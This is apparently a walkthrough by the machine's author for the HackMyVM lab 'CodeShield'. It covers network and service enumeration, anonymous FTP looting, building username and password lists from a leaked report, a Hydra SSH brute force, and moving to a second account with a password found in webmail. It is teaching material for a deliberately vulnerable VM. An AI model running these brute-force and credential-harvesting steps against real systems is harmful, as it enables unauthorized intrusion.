---
title: Write-up CodeShield on HackMyVM
author: eMVee
date: 2023-09-20 20:00:00 +0800
categories: [CTF, HackMyVM]
tags: [HackMyVM, OSCP]
render_with_liquid: false
---

CodeShield is a vulnerable virtual machine developed by me. This machine is categorized as an easy machine and is intended to guide aspiring hackers to their OSCP certification. The machine can be downloaded from [www.hackmyvm.eu](https://www.hackmyvm.eu). This machine can be a bit hard to gain a foothold. The key to hack this machine is enumeration. In this write-up I describe how you could hack this machine. If you want to learn something, try hacking this machine yourself first and if you really can't figure it out, you can read this writeup to learn from it.

## Getting started
Let's import the vulnerable machine into our lab environment. The vulnerable machine is build in a Oracle VirtualBox environment, so this should work perfectly withing this lab. I've created a separate virtual network for vulnerable machines. The new vulnerable machine should be configured to use this virtual network as well.

----
## Enumeration
Before starting any hacking activity we should start always with enumerating and documenting all discovered information before exploiting a target.
#### Network enumeration
First let's run a ping sweep wit fping within our virtual network.
```bash
┌──(emvee㉿kali)-[~]
└─$ fping -ag 10.0.2.0/24 2> /dev/null
10.0.2.1
10.0.2.2
10.0.2.3
10.0.2.6
10.0.2.15
```
Since the machines are running on a virtualbox instance I know some default IP addresses within my lab environment. The first three IP addresses can be skipped. The last IP address discovered with fping should be my kali instance. To be sure we should run the command `ip a` to identify our local IP address.
```bash
┌──(emvee㉿kali)-[~]
└─$ ip a       

1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:0e:ca:e6 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
       valid_lft 489sec preferred_lft 489sec
    inet6 fe80::a00:27ff:fe0e:cae6/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:f5:2d:ab:f8 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever

```
My internal IP address is indeed `10.0.2.15`, tis tells me our target is running on `10.0.2.6`. Now let's create a variable called `ip` to assign the IP address of our target.  
```bash
┌──(emvee㉿kali)-[~]
└─$ ip=10.0.2.6

```
Let's run a quick ping request to see if the machine is responding to our ping request.
```bash
┌──(emvee㉿kali)-[~]
└─$ ping -c 3 $ip
PING 10.0.2.6 (10.0.2.6) 56(84) bytes of data.
64 bytes from 10.0.2.6: icmp_seq=1 ttl=129 time=0.905 ms
64 bytes from 10.0.2.6: icmp_seq=2 ttl=129 time=1.08 ms
64 bytes from 10.0.2.6: icmp_seq=3 ttl=129 time=1.12 ms

--- 10.0.2.6 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2021ms
rtt min/avg/max/mdev = 0.905/1.036/1.124/0.094 ms

                                                        
```
Normally we can identify a box is running on a Linux  or a Windows Operating System based on the `ttl` value. The value in our response is `129` which is different compared with the Linux `64` ttl or the Windows `128` ttl. Depending on the hop in the network the ttl could be less then those values. In this case it is a kind of obfuscation.

Let's run a port scan with Nmap to identify open ports and services on our target.

```bash
┌──(emvee㉿kali)-[~]
└─$ sudo nmap -sC -sV -T4 -A -O -p- $ip
[sudo] password for emvee: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-29 12:50 CEST
Nmap scan report for 10.0.2.6
Host is up (0.0012s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           vsftpd 3.0.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.0.2.15
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--    1 1002     1002      2409722 Aug 28 18:46 CodeShield_pitch_deck.pdf
| -rw-rw-r--    1 1003     1003        67520 Aug 28 19:45 Information_Security_Policy.pdf
|_-rw-rw-r--    1 1004     1004       226435 Aug 28 18:29 The_2023_weak_password_report.pdf
22/tcp    open  ssh           OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 32:14:67:32:02:7a:b6:e4:7f:a7:22:0b:02:fd:ee:07 (RSA)
|   256 34:e4:d0:5d:bd:bc:9e:3f:4c:f9:1e:7d:3c:60:ce:6e (ECDSA)
|_  256 ef:3c:ff:f9:9a:a3:aa:7d:5a:82:73:b9:8c:b8:97:04 (ED25519)
25/tcp    open  smtp          Postfix smtpd
|_smtp-commands: SMTP: EHLO 521 5.5.1 Protocol error\x0D
80/tcp    open  http          nginx
|_http-title: Did not follow redirect to https://10.0.2.6/
110/tcp   open  pop3          Dovecot pop3d
| ssl-cert: Subject: commonName=mail.codeshield.hmv/organizationName=mail.codeshield.hmv/stateOrProvinceName=GuangDong/countryName=CN
| Not valid before: 2023-08-26T09:34:43
|_Not valid after:  2033-08-23T09:34:43
|_pop3-capabilities: PIPELINING SASL AUTH-RESP-CODE CAPA STLS RESP-CODES UIDL TOP
|_ssl-date: TLS randomness does not represent time
143/tcp   open  imap          Dovecot imapd (Ubuntu)
| ssl-cert: Subject: commonName=mail.codeshield.hmv/organizationName=mail.codeshield.hmv/stateOrProvinceName=GuangDong/countryName=CN
| Not valid before: 2023-08-26T09:34:43
|_Not valid after:  2033-08-23T09:34:43
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: IMAP4rev1 capabilities IDLE LOGIN-REFERRALS listed post-login have LITERAL+ SASL-IR ID more ENABLE OK Pre-login STARTTLS LOGINDISABLEDA0001
443/tcp   open  ssl/http      nginx
|_http-title: CodeShield - Home
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mail.codeshield.hmv/organizationName=mail.codeshield.hmv/stateOrProvinceName=GuangDong/countryName=CN
| Not valid before: 2023-08-26T09:34:43
|_Not valid after:  2033-08-23T09:34:43
| http-robots.txt: 1 disallowed entry 
|_/
465/tcp   open  ssl/smtp      Postfix smtpd
| ssl-cert: Subject: commonName=mail.codeshield.hmv/organizationName=mail.codeshield.hmv/stateOrProvinceName=GuangDong/countryName=CN
| Not valid before: 2023-08-26T09:34:43
|_Not valid after:  2033-08-23T09:34:43
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: mail.codeshield.hmv, PIPELINING, SIZE 15728640, ETRN, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING
587/tcp   open  smtp          Postfix smtpd
| ssl-cert: Subject: commonName=mail.codeshield.hmv/organizationName=mail.codeshield.hmv/stateOrProvinceName=GuangDong/countryName=CN
| Not valid before: 2023-08-26T09:34:43
|_Not valid after:  2033-08-23T09:34:43
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: mail.codeshield.hmv, PIPELINING, SIZE 15728640, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING
993/tcp   open  imaps?
| ssl-cert: Subject: commonName=mail.codeshield.hmv/organizationName=mail.codeshield.hmv/stateOrProvinceName=GuangDong/countryName=CN
| Not valid before: 2023-08-26T09:34:43
|_Not valid after:  2033-08-23T09:34:43
|_imap-capabilities: IMAP4rev1 capabilities IDLE LOGIN-REFERRALS listed post-login have LITERAL+ SASL-IR ID more ENABLE AUTH=LOGINA0001 Pre-login OK AUTH=PLAIN
|_ssl-date: TLS randomness does not represent time
995/tcp   open  pop3s?
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: PIPELINING SASL(PLAIN LOGIN) AUTH-RESP-CODE CAPA USER RESP-CODES UIDL TOP
| ssl-cert: Subject: commonName=mail.codeshield.hmv/organizationName=mail.codeshield.hmv/stateOrProvinceName=GuangDong/countryName=CN
| Not valid before: 2023-08-26T09:34:43
|_Not valid after:  2033-08-23T09:34:43
2222/tcp  open  ssh           OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 32:14:67:32:02:7a:b6:e4:7f:a7:22:0b:02:fd:ee:07 (RSA)
|   256 34:e4:d0:5d:bd:bc:9e:3f:4c:f9:1e:7d:3c:60:ce:6e (ECDSA)
|_  256 ef:3c:ff:f9:9a:a3:aa:7d:5a:82:73:b9:8c:b8:97:04 (ED25519)
3389/tcp  open  ms-wbt-server xrdp
22222/tcp open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2a:49:28:84:25:99:62:e8:29:68:88:d6:36:be:8e:d6 (ECDSA)
|_  256 20:9f:5b:3f:52:eb:a9:60:27:39:3b:e7:d8:17:8d:70 (ED25519)
MAC Address: 08:00:27:61:49:1F (Oracle VirtualBox virtual NIC)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=8/29%OT=21%CT=1%CU=39151%PV=Y%DS=1%DC=D%G=Y%M=080027%T
OS:M=64EDCD96%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10E%TI=Z%CI=Z%II=I
OS:%TS=A)SEQ(SP=101%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FE%GCD=1%ISR=1
OS:0C%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FF%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)OPS(O1=M5B
OS:4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST11NW7%O6
OS:=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF
OS:=Y%T=81%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=81%S=O%A=S+%F=AS%RD=0%
OS:Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=81%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y
OS:%T=81%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=81%W=0%S=A%A=Z%F=R%O=%R
OS:D=0%Q=)T7(R=Y%DF=Y%T=81%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=81%IP
OS:L=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=81%CD=S)

Network Distance: 1 hop
Service Info: Hosts: -mail.codeshield.hmv,  mail.codeshield.hmv; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   1.17 ms 10.0.2.6

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.31 seconds
```


There are a lot of open ports found with nmap and several services. Let's add them to our notes and add some information to the ports. This will help us when we have to think on how we could exploit the machine.

* Linux
	* Debian based on port 22 and port 2222
	* Ubuntu based on port 143 and port 22222
* Port 21
	* FTP
	* vsftpd 3.0.5
	* Anonymous logon
		* CodeShield_pitch_deck.pdf
		* Information_Security_Policy.pdf
		* The_2023_weak_password_report.pdf
* Port 22
	* SSH
	* OpenSSH 6.0p1 Debian 4+deb7u2
* Port 25
	* SMTP
	* Postfix smtpd
* Port 80
	* HTTP
	* nginx
		* Redirect
* Port 110
	* POP3
	* Dovecot pop3d
* Port 143
	* IMAP
	* Dovecot imapd
	* mail.codeshield.hmv
* Port 443
	* HTTPS
	* nginx
	* Title: CodeShield - Home
* Port 465
	* SMTP
	* Postfix smtpd
* Port 587
	* SMTP
	* Postfix smtpd
* Port 993
	* IMAPS
	* Dovecot imapd
	* mail.codeshield.hmv
* Port 995
	* IMAPS
	* Dovecot imapd
	* mail.codeshield.hmv
* Port 2222
	* SSH
	* OpenSSH 6.0p1 Debian 4+deb7u2
* Port 3389
	* RDP
* Port 22222
	* SSH
	* OpenSSH 8.9p1 Ubuntu

Based on the results of Nmap we could determine this machine is probably a Debian or an Ubuntu machine. Based on the services found we should enumerate more information. The following order is something I prefer to use in practice and based on the information what could be discovered within the Nmap results.

Some services to check:
1. FTP
2. HTTP/HTTPS/WEB
3. MAIL
4. SSH
5. RDP


-----
#### Enumerate the services
Based on the results there were some files detected within the FTP server via an anonymous logon. So let's check these files.
##### Anonymous logon to FTP
We can logon to the FTP service with the command `ftp $ip` followed by the the flag `-a` to logon as anonymous. Next we should check the files within the FTP server.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/CodeShield]
└─$ ftp $ip -a                        
Connected to 10.0.2.6.
220 (vsFTPd 3.0.5)
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||20026|)
150 Here comes the directory listing.
-rw-rw-r--    1 1002     1002      2409722 Aug 28 18:46 CodeShield_pitch_deck.pdf
-rw-rw-r--    1 1003     1003        67520 Aug 28 19:45 Information_Security_Policy.pdf
-rw-rw-r--    1 1004     1004       226435 Aug 28 18:29 The_2023_weak_password_report.pdf
226 Directory send OK.
ftp> 
```
There are three files with three different user IDs. There are multiple users on the machine available. Let's keep those in mind and add them to our notes as well.

Now we should download the files to our working directory.
```bash
ftp> get The_2023_weak_password_report.pdf
local: The_2023_weak_password_report.pdf remote: The_2023_weak_password_report.pdf
229 Entering Extended Passive Mode (|||40679|)
150 Opening BINARY mode data connection for The_2023_weak_password_report.pdf (226435 bytes).
100% |*********************************************************************************************************************************************************************|   221 KiB    2.13 MiB/s    00:00 ETA
226 Transfer complete.
226435 bytes received in 00:00 (2.12 MiB/s)
ftp> get Information_Security_Policy.pdf
local: Information_Security_Policy.pdf remote: Information_Security_Policy.pdf
229 Entering Extended Passive Mode (|||32486|)
150 Opening BINARY mode data connection for Information_Security_Policy.pdf (67520 bytes).
100% |*********************************************************************************************************************************************************************| 67520        4.18 MiB/s    00:00 ETA
226 Transfer complete.
67520 bytes received in 00:00 (3.98 MiB/s)
ftp> get CodeShield_pitch_deck.pdf
local: CodeShield_pitch_deck.pdf remote: CodeShield_pitch_deck.pdf
229 Entering Extended Passive Mode (|||49830|)
150 Opening BINARY mode data connection for CodeShield_pitch_deck.pdf (2409722 bytes).
100% |*********************************************************************************************************************************************************************|  2353 KiB   20.02 MiB/s    00:00 ETA
226 Transfer complete.
2409722 bytes received in 00:00 (19.93 MiB/s)
ftp> exit
221 Goodbye.

```

###### Check the PDF files
Since all files within the FTP server are downloaded to our working directory we should read the files carefully to identify valuable information. Let's start with the pitch deck to see what they want to pitch.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/CodeShield]
└─$ xdg-open CodeShield_pitch_deck.pdf    
```

While scrolling in the PDF we only could find something interesting on the last page of the file.
![Image](/assets/img/WriteUp/HackMyVM/CodeShield/Pasted image 20230830131424.png){: width="700" height="400" }

So we have found a name and an email address what we should add to our notes.
- Jessica Carlson
- j.carlson@codeshield.hmv

The next file we have to check is the weak password report. This is an interesting filename.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/CodeShield]
└─$ xdg-open The_2023_weak_password_report.pdf 
```

![Image](/assets/img/WriteUp/HackMyVM/CodeShield/Pasted image 20230830081801.png){: width="700" height="400" }


The report contains several top 20 password lists. We should create a custom wordlist based on this report. Visual Code helps us quickly creating this wordlist.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/CodeShield]
└─$ code wordlist.txt
┏━(Message from Kali developers)
┃ code is not the binary you may be expecting.
┃ You are looking for \"code-oss\"
┃ Starting code-oss for you...
┗━

┌──(emvee㉿kali)-[~/Documents/HMV/CodeShield]
└─$ head wordlist.txt                                             
Xxxxxxxxx001
Password123!
Greatplace2work!
Diciembre@2017
Hairdresser1!
1qa2ws3ed4rf
XXXX12345678
Hairdresser1
Xxxxxxxxx002
Xxxxxxxxxx01
....
```
 The last file contains some policies for information security. The file did not contain any information what we could use for now. We should continue enumerating the other services.

##### Enumerate the website
On the target port 80 and 443 were open and running a nginx server. This is a good indicator that the machine is running a web service. We should visit the website.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/CodeShield]
└─$ firefox $ip &

```


![Image](/assets/img/WriteUp/HackMyVM/CodeShield/Pasted image 20230830083034.png){: width="700" height="400" }

First we have to enumerate the whole website and make notes about them. 
Things what we have to look for are:
- Functions
- Input fields
- Contact details
- Names
- Articles
- etc.

![Image](/assets/img/WriteUp/HackMyVM/CodeShield/Pasted image 20230830083127.png){: width="700" height="400" }

In the reviews of the clients a name of an intern is mentioned. This intern might work for CodeShield. So let's add it to our notes.
- Kevin Valdez
	- Intern

![Image](/assets/img/WriteUp/HackMyVM/CodeShield/Pasted image 20230830083159.png){: width="700" height="400" }

There is a team page with photos, names and functions. This should be added to the notes as well.
- Jessica Carlson
	- CEO
- Mohammed Mansour
	- Security consultant
- Xian Tan
	- Auditor
- Annabella Cocci
	- Auditor
- Thomas Mitchell
	- Data Analyst
- Patrick Early
	- Developer

We should create a list of names who worked or are still working for the company.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/CodeShield]
└─$ code users.txt   
┏━(Message from Kali developers)
┃ code is not the binary you may be expecting.
┃ You are looking for \"code-oss\"
┃ Starting code-oss for you...
┗━

┌──(emvee㉿kali)-[~/Documents/HMV/CodeShield]
└─$ cat users.txt   
Kevin Valdez
Jessica Carlson
Mohammed Mansour
Xian Tan
Annabella Cocci
Thomas Mitchell
Patrick Early                                                                                                                                                                                                                  
```
While enumerating the website we are able to identify a blog section within the website.
![Image](/assets/img/WriteUp/HackMyVM/CodeShield/Pasted image 20230830083756.png){: width="700" height="400" }
Three titles are interesting for now:
- Audit results last years passwords
- How to choose a password
- Security starts with you

Let's read the first article.
![Image](/assets/img/WriteUp/HackMyVM/CodeShield/Pasted image 20230830083842.png){: width="700" height="400" }

Within the article a report is mentioned. The report was downloaded before and the custom wordlist based on this report was created.

Since we did only some basic enumeration on the website we should check for directories and files on the web server as well.
We could run dirsearch against the target to enumerate some directories.


```bash
┌──(emvee㉿kali)-[~/Documents/HMV/CodeShield]
└─$ dirsearch -u https://10.0.2.6

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/emvee/.dirsearch/reports/10.0.2.6/_23-08-30_09-59-16.txt

Error Log: /home/emvee/.dirsearch/logs/errors-23-08-30_09-59-16.log

Target: https://10.0.2.6/

[09:59:16] Starting: 
[09:59:17] 301 -  162B  - /js  ->  https://10.0.2.6/js/                    
[09:59:17] 403 -  548B  - /%2e%2e;/test                                    
[09:59:21] 301 -  162B  - /.well-known/carddav  ->  https://10.0.2.6/SOGo/dav
[09:59:21] 301 -  162B  - /.well-known/caldav  ->  https://10.0.2.6/SOGo/dav
[09:59:23] 200 -    1KB - /LICENSE.txt                                      
[09:59:23] 502 -  552B  - /Microsoft-Server-ActiveSync/                     
[09:59:27] 200 -   27KB - /about.html                                       
[09:59:28] 403 -  548B  - /admin/.htaccess                                  
[09:59:28] 403 -  548B  - /admin/.config
[09:59:32] 403 -  548B  - /administrator/.htaccess                          
[09:59:33] 403 -  548B  - /admpar/.ftppass                                  
[09:59:33] 403 -  548B  - /admrev/.ftppass                                  
[09:59:33] 403 -  548B  - /app/.htaccess                                    
[09:59:35] 403 -  548B  - /bitrix/.settings                                 
[09:59:35] 403 -  548B  - /bitrix/.settings.php.bak
[09:59:35] 403 -  548B  - /bitrix/.settings.php
[09:59:35] 403 -  548B  - /bitrix/.settings.bak                             
[09:59:39] 200 -   19KB - /contact.html                                     
[09:59:39] 301 -  162B  - /css  ->  https://10.0.2.6/css/                   
[09:59:42] 403 -  548B  - /ext/.deps                                        
[09:59:43] 200 -   34KB - /favicon.ico                                      
[09:59:45] 301 -  162B  - /img  ->  https://10.0.2.6/img/                   
[09:59:48] 403 -  548B  - /js/                                              
[09:59:48] 200 -    5KB - /iredadmin                                        
[09:59:48] 200 -   59KB - /index.html                                       
[09:59:49] 403 -  548B  - /lib/                                             
[09:59:49] 301 -  162B  - /lib  ->  https://10.0.2.6/lib/                   
[09:59:49] 403 -  548B  - /lib/flex/uploader/.actionScriptProperties        
[09:59:49] 403 -  548B  - /lib/flex/uploader/.project                       
[09:59:49] 403 -  548B  - /lib/flex/uploader/.flexProperties                
[09:59:49] 403 -  548B  - /lib/flex/varien/.actionScriptProperties
[09:59:49] 403 -  548B  - /lib/flex/uploader/.settings
[09:59:49] 403 -  548B  - /lib/flex/varien/.settings
[09:59:49] 403 -  548B  - /lib/flex/varien/.project                         
[09:59:49] 403 -  548B  - /lib/flex/varien/.flexLibProperties               
[09:59:50] 301 -  162B  - /mail  ->  https://10.0.2.6/mail/                 
[09:59:50] 200 -    5KB - /mail/                                            
[09:59:50] 403 -  548B  - /mailer/.env
[09:59:53] 401 -  574B  - /netdata/                                         
[09:59:54] 303 -    0B  - /newsletter/  ->  https://10.0.2.6/iredadmin/newsletter
[10:00:00] 403 -  548B  - /resources/sass/.sass-cache/                      
[10:00:00] 403 -  548B  - /resources/.arch-internal-preview.css             
[10:00:00] 200 -   26B  - /robots.txt                                       
[10:00:04] 403 -  548B  - /status                                           
[10:00:04] 403 -  548B  - /status?full=true                                 
[10:00:07] 403 -  548B  - /twitter/.env                                     
Task Completed                                                           
```

One of the directories `mail` is something interesting since we identified some email services on the target as well. So we have to check the directory in the web browser.
![Image](/assets/img/WriteUp/HackMyVM/CodeShield/Pasted image 20230830092155.png){: width="700" height="400" }

It looks like we can logon to a webmail service. This might be interesting if we have valid credentials.

----
## Initial foothold
Based on the information what we have found we can create a usernames list. This could help us to launch a brute force attack against the SSH or RDP service.
#### Create a list with possible usernames
First we have to clone a repository containing a script to generate some usernames based on the first and last name of a person.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/CodeShield]
└─$ git clone https://github.com/w0Tx/generate-ad-username.git
Cloning into 'generate-ad-username'...
remote: Enumerating objects: 5, done.
remote: Counting objects: 100% (5/5), done.
remote: Compressing objects: 100% (5/5), done.
remote: Total 5 (delta 0), reused 5 (delta 0), pack-reused 0
Receiving objects: 100% (5/5), done.

┌──(emvee㉿kali)-[~/Documents/HMV/CodeShield]
└─$ cd generate-ad-username 

┌──(emvee㉿kali)-[~/Documents/HMV/CodeShield/generate-ad-username]
└─$ ll                      
total 12
-rw-r--r-- 1 emvee emvee 1920 Aug 30 09:04 ADGenerator.py
-rw-r--r-- 1 emvee emvee  843 Aug 30 09:04 README.md
-rw-r--r-- 1 emvee emvee   75 Aug 30 09:04 test.txt

┌──(emvee㉿kali)-[~/Documents/HMV/CodeShield/generate-ad-username]
└─$ cp ../users.txt .

```
The input file to generate an username should contain a certain format so it can generate usernames. The first and last name should be seperated with a `,`.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/CodeShield/generate-ad-username]
└─$ nano users.txt      

┌──(emvee㉿kali)-[~/Documents/HMV/CodeShield/generate-ad-username]
└─$ cat users.txt    
Kevin,Valdez
Jessica,Carlson
Mohammed,Mansour
Xian,Tan
Annabella,Cocci
Thomas,Mitchell
Patrick,Early
```
As soon as we have created the input file we could run the script to generate usernames.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/CodeShield/generate-ad-username]
└─$ python3 ADGenerator.py users.txt > usernames.txt

┌──(emvee㉿kali)-[~/Documents/HMV/CodeShield/generate-ad-username]
└─$ head -n 20 usernames.txt
kevinvaldez
kevin-valdez
kevin.valdez
kevval
kev-val
kev.val
kvaldez
k-valdez
k.valdez
valdezkevin
valdez-kevin
valdez.kevin
valkev
val-kev
val.kev
vkevin
v-kevin
v.kevin
valdezk
valdez-k

```
#### Brute force SSH
Since there are several SSH services running on the target we should attack the correct service. Let's check port 22222 with the username kevin to see what is happening.
![Image](/assets/img/WriteUp/HackMyVM/CodeShield/Pasted image 20230830090928.png){: width="700" height="400" }

A warning banner is shown to us. This is probably our entrance to gain initial access. Now let's run Hydra with the custom password list and the generated usernames list.
```bash
┌──(emvee㉿kali)-[~/Documents/HMV/CodeShield/generate-ad-username]
└─$ hydra ssh://$ip -L usernames.txt -P ../wordlist.txt -s 22222
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-08-30 09:09:42
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 16170 login tries (l:147/p:110), ~253 tries per task
[DATA] attacking ssh://10.0.2.6:22222/
[STATUS] 683.00 tries/min, 683 tries in 00:01h, 15519 to do in 00:23h, 32 active
[STATUS] 636.00 tries/min, 1908 tries in 00:03h, 14299 to do in 00:23h, 27 active
[22222][ssh] host: 10.0.2.6   login: valdezk   password: Greatplace2work!


```
After a few minutes we got some credentials found with Hydra.
Let's add the password to our notes
```PASSWORD
Greatplace2work!
```
And we should add the username as well to our notes.
```
valdezk
```

Since we have have valid credentials we could logon to SSH as `valdezk`.

```bash
┌──(emvee㉿kali)-[~/Documents/HMV/CodeShield/generate-ad-username]
└─$ ssh valdezk@$ip -p 22222                                     
             @@@                            
      @@@@@@@@@  @@@@@@                     
 @@@@@@@@@@@@@@          (@@                
 @@@@@@@@@@@@@@           @@    ██████╗ ██████╗ ██████╗ ███████╗███████╗██╗  ██╗██╗███████╗██╗     ██████╗                                   
 @@@@@@@@@@@@@@           @@   ██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝██║  ██║██║██╔════╝██║     ██╔══██╗             
  @@@@@@@@@@@@@          @@    ██║     ██║   ██║██║  ██║█████╗  ███████╗███████║██║█████╗  ██║     ██║  ██║             
  @@@@@@@@@@@@@         @@@    ██║     ██║   ██║██║  ██║██╔══╝  ╚════██║██╔══██║██║██╔══╝  ██║     ██║  ██║             
    @@@@@@@@@@@        @@      ╚██████╗╚██████╔╝██████╔╝███████╗███████║██║  ██║██║███████╗███████╗██████╔╝             
     @@@@@@@@@@      @@@        ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝              
        @@@@@@@   @@@                       
           @@@@@@@                                                           

  _______________________________________________________________________________________________________
 |  _WARNING: This system is restricted to authorized users!___________________________________________  |
 | |                                                                                                   | |
 | | IT IS AN OFFENSE TO CONTINUE WITHOUT PROPER AUTHORIZATION.                                        | |
 | |                                                                                                   | |
 | | This system is restricted to authorized users.                                                    | | 
 | | Individuals who attempt unauthorized access will be prosecuted.                                   | | 
 | | If you're unauthorized, terminate access now!                                                     | | 
 | |                                                                                                   | |
 | |                                                                                                   | |
 | |___________________________________________________________________________________________________| |
 |_______________________________________________________________________________________________________|
valdezk@10.0.2.6's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-79-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Aug 30 07:15:01 AM UTC 2023

  System load:  0.13134765625      Processes:               290
  Usage of /:   28.2% of 47.93GB   Users logged in:         0
  Memory usage: 61%                IPv4 address for enp0s3: 10.0.2.6
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

1 update can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


*** System restart required ***
```
Since we could logon as valdezk to the system, we might try to logon to the webmail as this user as well, let's go back to the web browser and open the webmail.
![Image](/assets/img/WriteUp/HackMyVM/CodeShield/Pasted image 20230830092155.png){: width="700" height="400" }

We have identified an email address of Jessica Carlson `j.carlson@codeshield.hmv`. This format could be used to guess the email address for Kevin Valdez. This should be something like `k.valdez@codeshield.hmv`.  Let's try to logon to the webmail with the email address and the password found earlier for Kevin Valdez.
![Image](/assets/img/WriteUp/HackMyVM/CodeShield/Pasted image 20230830092644.png){: width="700" height="400" }

It looks like there is an email asking for some help from a coworker. We should read the email to see what is in it.
![Image](/assets/img/WriteUp/HackMyVM/CodeShield/Pasted image 20230830092801.png){: width="700" height="400" }

The coworker (Thomas Mitchell) is asking for help since Patrick did some magic in the terminal and he could not work with the application yet. The new coworker asks the intern to logon under Thomas Mitchells accounts and help with his issues. It looks like we have a new password found which we should add to our notes.
```
D@taWh1sperer!
```

Now let's enumerate the users on the target via the SSH session of Kevin.

```bash
valdezk@codeshield:~$ awk -F: '($3>=1000)&&($1!="nobody"){print $1}' /etc/passwd
earlyp
cowrie
vmail
mlmmj
iredadmin
iredapd
netdata
mitchellt
valdezk
carlsonj
mansourm
tanx
coccia

```

It looks like our second victim has the username: `mitchellt`. We should try to switch user to this user with the password found in the email.
## Get the USER flag
We can utilize the switch user command followed by the ysername`su mitchellt` and then enter the password. 
![Image](/assets/img/WriteUp/HackMyVM/CodeShield/Pasted image 20230830095003.png){: width="700" height="400" }

